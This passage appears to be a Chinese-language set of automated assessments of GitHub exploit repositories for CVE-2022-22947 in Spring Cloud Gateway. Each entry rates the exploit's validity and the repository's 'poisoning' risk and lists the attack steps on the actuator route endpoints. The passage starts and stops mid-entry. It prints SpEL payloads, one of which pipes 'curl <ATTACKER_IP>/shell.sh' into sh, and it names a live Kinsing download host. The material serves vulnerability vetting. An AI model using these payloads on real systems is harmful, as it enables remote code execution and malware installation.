1.  **漏洞原理：** 漏洞根源在于 SpEL 表达式的错误处理，攻击者可以通过 SpEL 表达式注入恶意代码。
2.  **利用步骤：**
    *   攻击者首先发送包含恶意 SpEL 表达式的请求到 `/actuator/gateway/routes/` 端点，添加一个新的路由，其中 `filter` 使用 `AddResponseHeader` 过滤器，`value` 包含恶意的 SpEL 表达式，SpEL表达式会被base64编码，保证其可以正常传输
    *   然后，攻击者通过访问 `/actuator/gateway/refresh` 端点，强制网关刷新路由配置，从而触发 SpEL 表达式的执行。
    *   最后，攻击者可以通过访问之前创建的路由(`/actuator/gateway/routes/66Sec`)，触发 SpEL 表达式的执行，并将执行结果通过请求返回。
3.  **POC 代码分析：**
    *   `CVE-2022-22947.py` 脚本首先定义了几个关键变量，包括 URL 路径（`payload1`, `payload2`, `payload3`）和请求头（`headers`）。
    *   `data` 变量包含经过 Base64 编码的恶意路由配置信息。该配置信息设置了一个名为 `WeianSec` 的路由，该路由使用 `AddResponseHeader` 过滤器，并将 SpEL 表达式注入到 `value` 属性中。
    *   脚本使用 `requests` 库发送 POST 请求到 `/actuator/gateway/routes/66Sec` 端点，添加恶意路由。
    *   然后，脚本发送 POST 请求到 `/actuator/gateway/refresh` 端点，刷新路由配置。
    *   最后，脚本发送 GET 请求到 `/actuator/gateway/routes/66Sec` 端点，提取执行结果。
    *   脚本中的 cmd变量，允许用户自定义执行的命令，增加了灵活性。
4.  **有效性：** 根据漏洞库信息、搜索结果和提供的 POC 代码，该 POC 代码是有效的，可以实现远程代码执行。
5.  **投毒风险：** 仓库中存在小概率的投毒风险（10%）。风险点在于，虽然主脚本 `CVE-2022-22947.py` 看似直接利用漏洞，但攻击者可以通过修改 `cmd` 变量来执行任意命令，并且README.md文件中提供的图片是经过处理的，不排除作者后期修改代码，添加恶意后门的可能。

**项目地址:** [SecNN/CVE-2022-22947_Rce_Exp](https://github.com/SecNN/CVE-2022-22947_Rce_Exp)

**漏洞详情:** [CVE-2022-22947](https://nvd.nist.gov/vuln/detail/CVE-2022-22947)

---

## POC #8

**来源**: [CVE-2022-22947-SiJiDo_CVE-2022-22947.md](../2022/CVE-2022-22947-SiJiDo_CVE-2022-22947.md)

## CVE-2022-22947-Spring Cloud Gateway-代码注入

**漏洞编号:** CVE-2022-22947

**漏洞类型:** 代码注入

**影响应用:** Spring Cloud Gateway

**危害等级:** 高危，允许远程代码执行

**影响版本:** 3.1.x (prior to 3.1.1+), 3.0.x (prior to 3.0.7+), and unsupported versions

**利用条件:** Gateway Actuator endpoint enabled, exposed, and unsecured

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2022-22947 是一个 Spring Cloud Gateway 的代码注入漏洞。攻击者可以在 Gateway Actuator 端点开启且未进行安全保护的情况下，通过构造恶意请求执行任意代码。漏洞利用方式如下：

1.  **漏洞原理：** 该漏洞源于 Spring Cloud Gateway 中 SpEL 表达式的执行，攻击者可以通过 SpEL 表达式注入恶意代码，进而执行任意命令。
2.  **利用条件：**
    *   目标系统使用存在漏洞的 Spring Cloud Gateway 版本。
    *   Gateway Actuator 端点被启用。
    *   Gateway Actuator 端点对外暴露且未进行任何身份验证。
3.  **漏洞利用代码分析：** 提供的Python脚本 (exp.py)首先定义了一个`GMem`类，将编译后的java字节码进行base64解码后赋值给`classbytes`。该Java类主要功能：
    *   通过反射机制定义类 (`ReflectUtils.defineClass`)
    *   执行命令
    *   进行base64编码/解码等操作。
    *   创建了一个包含payload的HashMap，payload被精心构造用于在目标服务器上执行命令。
    脚本通过修改`RequestMappingInfo`的`Builder`并调用`build()`方法触发漏洞，最终导致RCE。
4.  **有效性评估：** 根据漏洞信息和利用代码，该漏洞利用的有效性较高。CISA 将其添加到已知被利用的漏洞目录中，表明该漏洞在野外已被积极利用。
5.  **投毒风险评估：** 代码存在一定的投毒风险。虽然脚本主要功能是利用漏洞，但其中嵌入的Java类和SpEL表达式可能包含其他未知的恶意行为。该脚本通过Base64编码隐藏了部分代码，增加了分析难度。该脚本存在投毒风险的可能性为10%, 主要是由于代码混淆和潜在的Java恶意行为。
6.  **利用方式总结：**
    *   攻击者发送恶意构造的 HTTP 请求到 Gateway Actuator 端点。
    *   请求中包含 SpEL 表达式，用于执行任意代码。
    *   Spring Cloud Gateway 在处理请求时，由于没有对 SpEL 表达式进行充分的验证和过滤，导致代码注入。
    *   攻击者通过代码注入执行恶意命令，例如反弹 shell 或执行其他恶意操作。

综上所述，CVE-2022-22947 是一个严重的安全漏洞，攻击者可以利用它在目标系统上执行任意代码，因此需要及时修复。

**项目地址:** [SiJiDo/CVE-2022-22947](https://github.com/SiJiDo/CVE-2022-22947)

**漏洞详情:** [CVE-2022-22947](https://nvd.nist.gov/vuln/detail/CVE-2022-22947)

---

## POC #9

**来源**: [CVE-2022-22947-Sumitpathania03_CVE-2022-22947.md](../2022/CVE-2022-22947-Sumitpathania03_CVE-2022-22947.md)

## CVE-2022-22947 Spring Cloud Gateway 代码注入

**漏洞编号:** CVE-2022-22947

**漏洞类型:** 代码注入

**影响应用:** Spring Cloud Gateway

**危害等级:** 高危，可导致远程代码执行

**影响版本:** 3.1.x prior to 3.1.1+, 3.0.x prior to 3.0.7+

**利用条件:** Gateway Actuator 端点已启用、公开且未受保护。

**POC 可用性:** 是

**投毒风险:** 85%

## 详情

CVE-2022-22947 是一个 Spring Cloud Gateway 代码注入漏洞。当 Gateway Actuator 端点启用、公开且未受保护时，攻击者可以通过构造恶意的 SpEL 表达式来执行任意代码。 

**有效性：**
根据漏洞信息、搜索结果和提供的 POC 代码，该漏洞利用是有效的。POC 通过向 `/actuator/gateway/routes` 端点发送 POST 请求来创建新的路由，并在 `AddResponseHeader` 过滤器中使用 SpEL 表达式注入恶意代码。然后刷新路由，并通过访问新创建的路由触发代码执行。最后删除该路由。

**投毒风险：**
提供的 POC 代码存在较高的投毒风险。具体体现在：
1.  **恶意脚本下载和执行：** POC 代码中的 SpEL 表达式尝试从远程服务器（如 `94.103.87.71/scg.sh` ）下载并执行 shell 脚本。 这允许攻击者注入任意恶意代码，例如下载和安装 Kinsing 恶意软件。
2.  **后门植入：** 下载的 shell 脚本可能包含后门代码，允许攻击者在受害者系统上保持持久访问。
3. ** Kinsing恶意软件:** 通过分析shell脚本，发现最终目的是下载并安装 Kinsing 恶意软件

因此，此存储库的投毒风险非常高，约为 85%。使用此POC需要谨慎，务必在隔离环境中进行分析，确保不会对本地环境造成风险。

**利用方式：**
1.  **检查 Actuator 端点：** 确认目标 Spring Cloud Gateway 实例的 Actuator 端点是否启用、公开且未受保护。
2.  **创建恶意路由：** 使用 POST 请求向 `/actuator/gateway/routes` 端点创建一个新的路由。在路由的 `filters` 部分，使用 `AddResponseHeader` 过滤器，并在 `value` 字段中插入包含恶意 SpEL 表达式的代码。 例如:

   ```json
   {
	 "id": "poc",
	 "filters": [{
	   "name": "AddResponseHeader",
	   "args": {"name": "Result","value": "#{new java.lang.String(T(org.springframework.util.StreamUtils).copyToByteArray(T(java.lang.Runtime).getRuntime().exec(new String[]{\"/bin/sh\",\"-c\",\"curl -s <ATTACKER_IP>/shell.sh|sh\"}).getInputStream()))}"}
	   }],
	 "uri": "http://example.com",
	 "order": 0
	}
   ```

3.  **刷新路由：** 使用 POST 请求向 `/actuator/gateway/refresh` 端点发送请求，以刷新所有路由。
4.  **触发代码执行：** 访问新创建的路由，触发 SpEL 表达式的执行。
5.  **清理：** 使用 DELETE 请求向 `/actuator/gateway/routes/{route_id}` 端点删除创建的恶意路由。

**项目地址:** [Sumitpathania03/CVE-2022-22947](https://github.com/Sumitpathania03/CVE-2022-22947)

**漏洞详情:** [CVE-2022-22947](https://nvd.nist.gov/vuln/detail/CVE-2022-22947)

---

## POC #10

**来源**: [CVE-2022-22947-Wrong-pixel_CVE-2022-22947-exp.md](../2022/CVE-2022-22947-Wrong-pixel_CVE-2022-22947-exp.md)

## CVE-2022-22947-Spring Cloud Gateway代码注入

**漏洞编号:** CVE-2022-22947

**漏洞类型:** 代码注入

**影响应用:** Spring Cloud Gateway

**危害等级:** 高危，允许远程代码执行

**影响版本:** Spring cloud gateway versions 3.1.x prior to 3.1.1+, 3.0.x prior to 3.0.7+ and all old and unsupported versions

**利用条件:** Gateway Actuator endpoint is enabled, exposed and unsecured.

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2022-22947 是一个 Spring Cloud Gateway 中的代码注入漏洞。根据漏洞描述，当 Gateway Actuator 端点启用、公开且未受到保护时，应用程序容易受到代码注入攻击。攻击者可以发送恶意构造的请求，从而允许在远程主机上执行任意远程代码。

**有效性：**
提供的 POC 代码 `CVE-2022-22947-memshell.py` 看起来是有效的。它利用了 SpEL 表达式注入漏洞，通过构造包含恶意 SpEL 表达式的请求，在目标系统上动态定义一个名为 `SpringRequestMappingMemshell` 的类，实现内存马注入。代码首先对恶意类进行base64编码, 然后通过SpEL表达式解码并加载到JVM中,达到了远程代码执行的效果。

**投毒风险：**
评估 POC 代码是否存在投毒风险。代码的主要功能是利用漏洞注入内存马，实现远程代码执行。其中注入的`SpringRequestMappingMemshell`类需要进一步分析。

通过检查代码，发现注入的类功能是注册一个requestMapping，执行的command命令可以从request参数中获取，具有命令执行功能，但它本身是漏洞利用的一部分，不能算作是作者隐藏的投毒代码。

但考虑到任何远程代码执行漏洞都可能被滥用，因此使用此POC的风险仍然较高。考虑到风险的存在，但不是代码编写者有意为之的恶意添加，评估投毒风险为5%。

**利用方式：**
1.  **前提条件：** 目标 Spring Cloud Gateway 实例的 Actuator 端点必须启用、公开且未受保护。
2.  **漏洞利用：** 攻击者构造一个包含恶意 SpEL 表达式的 HTTP 请求，该表达式会被 Gateway Actuator 处理。
3.  **代码注入：** 恶意 SpEL 表达式用于在服务器的内存中定义一个新的 Java 类 (内存马)。
4.  **远程代码执行：** 注入的 Java 类执行攻击者指定的任意代码。

总而言之，此漏洞的利用方式是通过SpEL表达式注入，动态注册一个新的路由，并将处理逻辑绑定到恶意构造的Java类，该类可以接受参数并在服务器上执行任意命令。此过程允许攻击者在目标系统上实现未经授权的远程代码执行。

**项目地址:** [Wrong-pixel/CVE-2022-22947-exp](https://github.com/Wrong-pixel/CVE-2022-22947-exp)

**漏洞详情:** [CVE-2022-22947](https://nvd.nist.gov/vuln/detail/CVE-2022-22947)

---

## POC #11

**来源**: [CVE-2022-22947-Zh0um1_CVE-2022-22947.md](../2022/CVE-2022-22947-Zh0um1_CVE-2022-22947.md)

## CVE-2022-22947 - Spring Cloud Gateway 代码注入

**漏洞编号:** CVE-2022-22947

**漏洞类型:** 代码注入

**影响应用:** Spring Cloud Gateway

**危害等级:** 高危，可导致远程代码执行

**影响版本:** Spring Cloud Gateway 3.1.x < 3.1.1+, 3.0.x < 3.0.7+

**利用条件:** Gateway Actuator endpoint 启用、暴露且未做安全保护

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2022-22947 存在于 Spring Cloud Gateway 中，当 Actuator 端点启用且未授权时，攻击者可以通过构造恶意的 SpEL 表达式，利用`Path`路由断言中的 SpEL 注入漏洞执行任意代码。提供的 POC 代码旨在通过动态定义Java类的方式注入哥斯拉内存马。 

**有效性：**
根据漏洞库信息和搜索结果，该漏洞已被证实存在，且有在野利用。提供的 POC 代码实现了利用该漏洞注入哥斯拉内存马，因此该 POC 有效。

**投毒风险分析：**
分析给出的POC代码，主要功能是利用漏洞注入哥斯拉内存马，实现远程代码执行。虽然POC本身是为了利用漏洞，但如果用户直接使用此POC而不了解其行为，可能会被利用来植入恶意后门。

*   代码主要功能：该代码使用Go语言编写，利用 Spring Cloud Gateway 的 SpEL 表达式注入漏洞。它构造一个包含恶意 SpEL 表达式的请求，该表达式用于在目标服务器上动态定义一个 Java 类（哥斯拉内存马），从而实现远程代码执行。
*   投毒可能性：
    *   **高：** 代码直接注入内存马，如果目标系统部署了恶意程序，攻击者也可以构造其他的恶意代码注入到内存中，比如替换关键组件、窃取数据等。
    *   **低：** 由于代码的目的是利用漏洞注入内存马，从这个角度看，本身就是一种攻击行为，很难区分是“正常”利用还是“投毒”。因此，认为该仓库存在一定投毒风险，风险等级较低。

基于以上分析，判定投毒风险为10%。

**利用方式：**
1.  **前提条件：** 目标 Spring Cloud Gateway 实例启用了 Actuator 端点，且未进行安全保护（例如，未进行身份验证）。
2.  **构造恶意请求：** 攻击者构造一个包含恶意 SpEL 表达式的 HTTP POST 请求，该表达式利用 `T(org.springframework.cglib.core.ReflectUtils).defineClass` 动态定义一个 Java 类（通常是一个 Webshell 或内存马）。
3.  **利用 Path 路由断言：**  该恶意 SpEL 表达式被嵌入到 Spring Cloud Gateway 的 `Path` 路由断言的参数中。
4.  **发送请求：** 将构造的恶意请求发送到 `/actuator/gateway/routes` 端点。
5.  **代码执行：** Spring Cloud Gateway 在处理路由断言时，会解析并执行 SpEL 表达式，从而在目标服务器上执行攻击者注入的恶意代码。
6.  **内存马驻留：** 注入的哥斯拉内存马会驻留在服务器内存中，允许攻击者通过特定的 HTTP 请求与服务器交互，执行任意命令或上传文件。

**项目地址:** [Zh0um1/CVE-2022-22947](https://github.com/Zh0um1/CVE-2022-22947)

**漏洞详情:** [CVE-2022-22947](https://nvd.nist.gov/vuln/detail/CVE-2022-22947)

---

## POC #12

**来源**: [CVE-2022-22947-aesm1p_CVE-2022-22947-POC-Reproduce.md](../2022/CVE-2022-22947-aesm1p_CVE-2022-22947-POC-Reproduce.md)

## CVE-2022-22947-Spring Cloud Gateway Code Injection

**漏洞编号:** CVE-2022-22947

**漏洞类型:** 代码注入

**影响应用:** Spring Cloud Gateway

**危害等级:** 高危，可导致远程代码执行

**影响版本:** Spring Cloud Gateway versions 3.1.x prior to 3.1.1+, 3.0.x prior to 3.0.7+

**利用条件:** Gateway Actuator endpoint is enabled, exposed, and unsecured

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2022-22947是一个存在于Spring Cloud Gateway中的代码注入漏洞。当Gateway Actuator端点被启用、暴露且未进行安全保护时，远程攻击者可以通过构造恶意请求执行任意代码。漏洞根源在于getValue方法中不安全的SpEL表达式求值。

**有效性：**
根据提供的漏洞信息和搜索结果，该漏洞是真实存在的，且已经有公开的POC。漏洞利用代码是一个Maven项目，旨在重现漏洞。因此，提供的POC代码很可能是有效的。

**投毒风险：**
提供的代码仓库包含一个`README.md`文件和一个`mvnw`脚本。`mvnw` 是 Maven Wrapper 脚本，用于在没有安装 Maven 的情况下构建项目。检查 `mvnw` 脚本，它主要负责下载和启动 Maven，没有发现明显的恶意行为。但是，仍然存在一定的投毒风险，例如：
1.  **依赖项投毒：** 构建项目时使用的 Maven 依赖项可能包含恶意代码。 这种情况发生的概率较低，但存在可能。
2.  **构建脚本投毒：** `pom.xml`文件(未提供)中可能存在恶意插件或目标，在构建过程中执行恶意代码。由于未提供此文件，无法对此进行评估。

考虑到提供的文件主要与Maven构建相关，直接植入后门的难度较高，但通过依赖项投毒的可能性是存在的。因此，投毒风险估计为10%。

**利用方式：**
1.  **确定目标：** 找到运行着存在漏洞的Spring Cloud Gateway实例，并且其Actuator端点对外开放且未进行认证。
2.  **构造恶意请求：** 构造包含恶意SpEL表达式的HTTP请求，发送到Actuator端点。这些SpEL表达式能够执行任意系统命令或代码。
3.  **远程代码执行：**  Spring Cloud Gateway解析并执行恶意SpEL表达式，从而导致远程代码执行。
4.  **控制系统：** 攻击者利用执行的恶意代码控制受害系统。

**优先级：**
根据信息来源的重要性排序：搜索引擎结果 > 漏洞利用代码 > 漏洞库信息

**项目地址:** [aesm1p/CVE-2022-22947-POC-Reproduce](https://github.com/aesm1p/CVE-2022-22947-POC-Reproduce)

**漏洞详情:** [CVE-2022-22947](https://nvd.nist.gov/vuln/detail/CVE-2022-22947)

---

## POC #13

**来源**: [CVE-2022-22947-anansec_CVE-2022-22947_EXP.md](../2022/CVE-2022-22947-anansec_CVE-2022-22947_EXP.md)

## CVE-2022-22947-Spring Cloud Gateway-代码注入

**漏洞编号:** CVE-2022-22947

**漏洞类型:** 代码注入

**影响应用:** Spring Cloud Gateway

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** 3.1.x prior to 3.1.1+, 3.0.x prior to 3.0.7+ and all old and unsupported versions

**利用条件:** Gateway Actuator endpoint is enabled, exposed and unsecured

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2022-22947是Spring Cloud Gateway中的一个代码注入漏洞。当Gateway Actuator endpoint启用、公开且未进行安全保护时，攻击者可以通过构造恶意请求，在远程主机上执行任意代码。根据提供的漏洞利用代码，该PoC利用了SpEL表达式注入，通过向`/actuator/gateway/routes/check01`端点发送包含恶意SpEL表达式的POST请求，然后刷新路由并访问该路由，触发SpEL表达式执行。EXP具有单个目标验证、批量验证、反弹shell的功能。

**有效性：**
根据漏洞库信息、搜索结果和提供的漏洞利用代码，可以判断该漏洞的PoC代码是有效的。搜索结果中多个链接都表明该漏洞被广泛关注，且存在公开的利用代码。

**投毒风险：**
PoC代码本身主要通过SpEL表达式注入执行命令，没有发现明显的恶意植入行为。但PoC会向目标系统添加路由，并执行命令，存在一定的风险。例如：
*   **资源消耗：** 频繁的路由添加和删除可能导致资源消耗，影响服务性能。
*   **命令执行风险：** 虽然PoC本身是为了验证漏洞，但如果被恶意利用，可能执行恶意命令。
*   **依赖风险：** PoC可能依赖特定的环境或库，如果目标环境不满足要求，可能导致利用失败或产生其他问题。
PoC代码中存在投毒代码的可能性较低，大约10%。这个百分比是基于代码的分析以及PoC作者的动机推断得出的。

**利用方式：**
1.  **前提条件：** Spring Cloud Gateway的Actuator端点已启用、公开且未进行安全保护。
2.  **发送恶意请求：** 构造包含恶意SpEL表达式的JSON数据，并将其作为POST请求发送到`/actuator/gateway/routes/check01`端点。
3.  **刷新路由：** 向`/actuator/gateway/refresh`端点发送POST请求，刷新路由，使新增的路由生效。
4.  **触发表达式执行：** 访问新增的路由，触发SpEL表达式执行，从而执行任意代码。
5.  **清理路由：** 删除新增的路由，避免留下后门。（PoC代码中包含删除路由的步骤）

**项目地址:** [anansec/CVE-2022-22947_EXP](https://github.com/anansec/CVE-2022-22947_EXP)

**漏洞详情:** [CVE-2022-22947](https://nvd.nist.gov/vuln/detail/CVE-2022-22947)

---

## POC #14

**来源**: [CVE-2022-22947-cc3305_CVE-2022-22947.md](../2022/CVE-2022-22947-cc3305_CVE-2022-22947.md)

## CVE-2022-22947-Spring Cloud Gateway代码注入

**漏洞编号:** CVE-2022-22947

**漏洞类型:** 代码注入

**影响应用:** Spring Cloud Gateway

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** 3.1.x prior to 3.1.1+, 3.0.x prior to 3.0.7+ and all old and unsupported versions

**利用条件:** Gateway Actuator endpoint必须启用、暴露且未进行安全保护

**POC 可用性:** 是

**投毒风险:** 1%

## 详情

CVE-2022-22947是Spring Cloud Gateway中的一个代码注入漏洞。当Gateway Actuator endpoint启用、暴露且未进行安全保护时，远程攻击者可以发送恶意构造的请求，从而在远程主机上执行任意代码。漏洞的根源在于`getValue`方法中不安全的SpEL表达式评估。利用过程为：

1.  攻击者构造包含恶意SpEL表达式的payload，该表达式可以执行任意命令。
2.  攻击者通过POST请求将payload发送到`/actuator/gateway/routes/{id}`端点，其中`{id}`是一个攻击者自定义的路由ID。
3.  Spring Cloud Gateway解析payload中的SpEL表达式，导致远程代码执行。
4.  攻击者可以通过`/actuator/gateway/refresh`端点刷新路由配置，使payload生效。

该POC代码通过向 `/actuator/gateway/routes/cc3305` 发送包含恶意SpEL表达式的JSON payload来利用此漏洞，SpEL表达式通过java.lang.Runtime执行任意命令。 代码首先检查目标是否易受攻击（虽然目前返回True）。然后，它准备要执行的命令，并将其嵌入到SpEL表达式中，该表达式会被注入到路由定义中。

关于投毒风险，该脚本主要功能是利用漏洞执行命令。 潜在的投毒风险在于，攻击者可能会修改脚本，使其在执行命令之前或之后执行其他恶意操作，例如下载和执行恶意软件。 但是，提供的代码没有明显的投毒迹象。 投毒的概率较低，大约为1%。 恶意行为者可能会分发修改后的版本。

**有效性评估:**根据漏洞库信息、搜索结果和提供的PoC代码，该漏洞利用是有效的，前提是满足漏洞利用条件。该PoC代码能够成功利用漏洞执行任意命令。


**项目地址:** [cc3305/CVE-2022-22947](https://github.com/cc3305/CVE-2022-22947)

**漏洞详情:** [CVE-2022-22947](https://nvd.nist.gov/vuln/detail/CVE-2022-22947)

---

## POC #15

**来源**: [CVE-2022-22947-k3rwin_spring-cloud-gateway-rce.md](../2022/CVE-2022-22947-k3rwin_spring-cloud-gateway-rce.md)

## CVE-2022-22947 Spring Cloud Gateway RCE

**漏洞编号:** CVE-2022-22947

**漏洞类型:** 代码注入

**影响应用:** Spring Cloud Gateway

**危害等级:** 高危，可导致远程代码执行

**影响版本:** Spring cloud gateway versions 3.1.x prior to 3.1.1+, 3.0.x prior to 3.0.7+ and all old and unsupported versions

**利用条件:** Gateway Actuator endpoint is enabled, exposed and unsecured

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2022-22947是Spring Cloud Gateway中的一个代码注入漏洞，当Gateway Actuator端点启用、暴露且未进行安全保护时，攻击者可以利用SpEL表达式注入执行任意代码。

**有效性：**

根据漏洞库信息、搜索引擎结果以及提供的漏洞利用代码，此漏洞是有效的。多个来源都证实了该漏洞的存在以及远程代码执行的可能性。提供的POC代码可以直接利用该漏洞。

**投毒风险：**

分析提供的POC代码，发现主要的恶意代码在于 `spring-cloud-gateway-rce.py` 中构建和发送的payload。该payload利用SpEL表达式在目标系统上执行任意命令。虽然POC本身是为了演示漏洞利用，但在实际场景中，攻击者可能会修改 `-c` 参数来执行恶意操作。`requirements.txt` 文件声明了项目所需的依赖项（colorama, requests, urllib3），这些库本身没有已知的恶意行为，但如果项目被篡改，可能会引入恶意依赖。

评估投毒风险时，主要考虑以下因素：

*   **代码可读性：** 代码相对简单，易于理解，这意味着潜在的恶意修改也更容易被发现。
*   **外部依赖：** 项目依赖外部库，如果这些库的源被攻破，可能会引入恶意代码。
*   **Payload生成：** Payload是动态生成的，如果攻击者能够控制Payload生成过程，就可以注入恶意代码。

综合来看，此仓库存在一定的投毒风险，风险值评估为10%。主要的风险点在于攻击者可能会修改Payload生成逻辑或引入恶意的依赖项，利用使用者执行恶意代码。

**利用方式：**

1.  **漏洞触发前提：** Spring Cloud Gateway的Actuator端点必须启用、暴露并且没有进行安全保护（例如，没有进行身份验证）。
2.  **构造Payload：** POC代码根据目标主机的操作系统（Linux或Windows）构造包含SpEL表达式的JSON payload。该payload利用`AddResponseHeader`过滤器，将执行命令的结果添加到响应头中。
3.  **发送Payload：** 使用POST请求将payload发送到`/actuator/gateway/routes/{id}`端点，其中`{id}`是路由的ID（在POC中为`k`）。
4.  **刷新路由：** 发送POST请求到`/actuator/gateway/refresh`端点，强制Spring Cloud Gateway刷新路由配置，从而触发SpEL表达式的执行。
5.  **获取结果：** 发送GET请求到`/actuator/gateway/routes/{id}`端点，获取路由信息，其中包含命令执行的结果。
6.  **删除路由：** 发送DELETE请求到`/actuator/gateway/routes/{id}`端点，删除添加的路由。

简而言之，攻击者通过构造包含恶意SpEL表达式的请求，利用Actuator端点动态注册路由，并在路由刷新时触发SpEL表达式执行，从而实现远程代码执行。

**项目地址:** [k3rwin/spring-cloud-gateway-rce](https://github.com/k3rwin/spring-cloud-gateway-rce)

**漏洞详情:** [CVE-2022-22947](https://nvd.nist.gov/vuln/detail/CVE-2022-22947)

---

## POC #16

**来源**: [CVE-2022-22947-kkx600_Burp_VulPscan.md](../2022/CVE-2022-22947-kkx600_Burp_VulPscan.md)

## CVE-2022-22947-Spring Cloud Gateway 代码注入

**漏洞编号:** CVE-2022-22947

**漏洞类型:** 代码注入

**影响应用:** Spring Cloud Gateway

**危害等级:** 高危，可导致远程代码执行

**影响版本:** 3.1.x (prior to 3.1.1+), 3.0.x (prior to 3.0.7+), 以及所有旧的和不支持的版本

**利用条件:** Gateway Actuator 端点已启用、暴露且未进行安全保护。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2022-22947 影响 Spring Cloud Gateway。当 Gateway Actuator 端点启用、暴露且未进行安全保护时，攻击者可以利用 SpEL 表达式注入执行任意代码。

**有效性：**
根据漏洞信息和搜索结果，该漏洞的POC代码是有效的。存在公开的漏洞利用代码和关于漏洞利用的详细分析。

**投毒风险：**
提供的代码片段不完整，无法进行全面的投毒分析。BurpExtender.java调用了 spring_CVE_2022_22947.poc，这部分代码是POC实现的核心，未提供，因此无法分析该部分的安全性。HttpsRequest.java 提供了一个发送 HTTP/HTTPS 请求的功能，本身不存在明显的恶意代码。Burp扩展通常需要授予较高的权限，如果POC代码中包含恶意逻辑，如未经授权的数据收集或篡改，则存在投毒风险。目前根据现有的代码片段，只能初步判断存在较低的投毒风险。

**利用方式：**
1.  **确定目标：** 找到运行 Spring Cloud Gateway 且 Actuator 端点已启用、暴露且未进行安全保护的实例。
2.  **构造恶意请求：** 构造包含恶意 SpEL 表达式的 HTTP 请求，该表达式将在 Actuator 端点被解析和执行。通常攻击方式是向/actuator/gateway/routes接口发送包含恶意SpEL表达式的请求，修改路由配置。
3.  **执行代码：** 成功利用后，攻击者可以在目标服务器上执行任意代码。

**优先级：**
根据搜索结果，确认这是一个已知且被积极利用的漏洞。漏洞利用代码的存在进一步证实了其可利用性。

**项目地址:** [kkx600/Burp_VulPscan](https://github.com/kkx600/Burp_VulPscan)

**漏洞详情:** [CVE-2022-22947](https://nvd.nist.gov/vuln/detail/CVE-2022-22947)

---

## POC #17

**来源**: [CVE-2022-22947-kmahyyg_CVE-2022-22947.md](../2022/CVE-2022-22947-kmahyyg_CVE-2022-22947.md)

## CVE-2022-22947 Spring Cloud Gateway 代码注入

**漏洞编号:** CVE-2022-22947

**漏洞类型:** 代码注入

**影响应用:** Spring Cloud Gateway

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** Spring Cloud Gateway < 3.1.1, Spring Cloud Gateway < 3.0.7

**利用条件:** Gateway Actuator endpoint 启用、暴露且未进行安全保护

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2022-22947是Spring Cloud Gateway中的一个代码注入漏洞。当Gateway Actuator endpoint启用、暴露且未进行安全保护时，远程攻击者可以发送特制的恶意请求，利用SpEL表达式注入执行任意代码。

**有效性：**
提供的POC代码是有效的。从搜索引擎结果和漏洞利用代码来看，该漏洞利用方式已经公开，并且存在可用的PoC。

**投毒风险：**
提供的漏洞利用代码主要包含以下内容：
1.  README文件，描述了漏洞信息，受影响版本，修复建议等。
2.  漏洞复现步骤，包含发送恶意请求添加路由，刷新路由，查看结果，清理路由等步骤说明，以及对应的数据包示例。
3.  Python脚本，用于自动化漏洞利用过程，通过构造恶意请求实现远程代码执行。

分析代码，主要风险在于攻击者可能将恶意代码隐藏在SpEL表达式中，例如执行反弹shell或下载恶意软件。在提供的代码中，`Spring Cloud Gateway Actuator API SpEL表达式注入命令执行（CVE-2022-22947）.md`文件中展示的PoC中使用了`#{new java.lang.String(T(org.springframework.util.StreamUtils).copyToByteArray(T(java.lang.Runtime).getRuntime().exec(new String[]{"id"}).getInputStream()))}`，该payload用于执行`id`命令，若替换为其他命令，存在潜在的风险。

**利用方式：**
1.  攻击者首先发送POST请求到`/actuator/gateway/routes/{route_id}`，创建一个包含恶意SpEL表达式的路由。SpEL表达式被嵌入到`filters`的`AddResponseHeader`的`value`参数中，用于执行任意命令。
2.  然后，攻击者发送POST请求到`/actuator/gateway/refresh`，强制网关刷新路由配置，触发SpEL表达式的执行。
3.  攻击者发送GET请求到`/actuator/gateway/routes/{route_id}`，查看执行结果。
4.  最后，攻击者发送DELETE请求到`/actuator/gateway/routes/{route_id}`，删除恶意路由。

综上所述，该漏洞利用的有效性较高。虽然存在一定的投毒风险（10%），但可以通过仔细审查和修改PoC代码来降低风险。

**项目地址:** [kmahyyg/CVE-2022-22947](https://github.com/kmahyyg/CVE-2022-22947)

**漏洞详情:** [CVE-2022-22947](https://nvd.nist.gov/vuln/detail/CVE-2022-22947)

---

## POC #18

**来源**: [CVE-2022-22947-qq87234770_CVE-2022-22947.md](../2022/CVE-2022-22947-qq87234770_CVE-2022-22947.md)

## CVE-2022-22947 - Spring Cloud Gateway Code Injection

**漏洞编号:** CVE-2022-22947

**漏洞类型:** 代码注入

**影响应用:** Spring Cloud Gateway

**危害等级:** 高危，可远程代码执行

**影响版本:** Spring cloud gateway versions 3.1.x prior to 3.1.1+, 3.0.x prior to 3.0.7+ and all old and unsupported versions

**利用条件:** Gateway Actuator endpoint 启用，暴露且未授权

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2022-22947 是 Spring Cloud Gateway 中的一个代码注入漏洞。当 Gateway Actuator 端点启用、暴露且未授权时，远程攻击者可以发送恶意构造的请求，从而在远程主机上执行任意代码。

**有效性：**

提供的 Python POC 代码利用了 Spring Expression Language (SpEL) 注入漏洞。该脚本允许执行任意命令，或通过反弹 shell 获取服务器的控制权。因此，该 POC 代码是有效的。

**投毒风险：**

查看POC代码，该代码的主要功能是利用漏洞进行命令执行或反弹shell。代码中包含以下几个部分，
* 定义请求头和payload结构
* 通过`actuator/gateway/routes/hacktest`创建一个恶意的路由配置，利用SpEL表达式执行命令
* 刷新gateway配置`actuator/gateway/refresh`
* 访问创建的路由`actuator/gateway/routes/hacktest`，触发命令执行。
* 包含执行命令和反弹shell两种模式。

该代码结构清晰，功能明确，主要目的是为了验证和利用漏洞。主要风险集中于漏洞利用本身，而非作者植入的恶意代码。**但是**，任何漏洞利用代码都具有潜在的风险，因为它们可以被用于恶意目的。例如，攻击者可能会修改此 POC 代码以自动化大规模攻击，或将其与其他漏洞利用结合使用。另外代码中的代理设置，如果被恶意修改，可能会导致流量劫持，这里判断投毒风险为10%。

**利用方式：**

